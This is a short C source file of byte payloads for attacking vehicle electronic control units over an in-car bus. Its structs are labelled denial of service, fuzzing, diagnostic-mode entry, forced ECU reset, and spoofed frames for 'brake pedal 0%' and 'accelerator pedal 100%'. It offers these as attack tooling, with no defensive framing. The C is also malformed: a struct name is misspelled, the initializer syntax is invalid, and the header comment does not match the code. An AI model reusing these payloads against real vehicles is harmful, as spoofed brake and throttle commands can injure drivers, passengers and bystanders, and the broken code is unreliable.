#include "payloads.h"

/*================================================================
payloads.c
this function resets payload structures
==================================================================*/

struct paylaods dos = {
    .payload3[8] = {0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78};
};

struct payloads replay ={

};

struct payloads fuzzing = {
    .payload1[3] = {0x02, 0x4e, 0x00};      //tx payload to make reply
    .payload2[3] = {0x02, 0x7e, 0x00};      //rx payload to check ecu live
};

struct payloads suspension ={
    .payload1[3] = {0x02, 0x10, 0x02};      //tx payload to enter diag mode
    .payload2[3] = {0x02, 0x11, 0x01};      //tx payload to make ecu reset
};

struct payloads msq = {
    .payload1[3] = {0x02, 0x10, 0x02};                                  //tx payload to enter diag mode
    .payload2[3] = {0x02, 0x11, 0x01};                                  //tx payload to make ecu reset
    .payload3[8] = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12};    //tx payload break pedal 0%
    .payload4[8] = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12};    //tx payload acceel pedal 100%
};
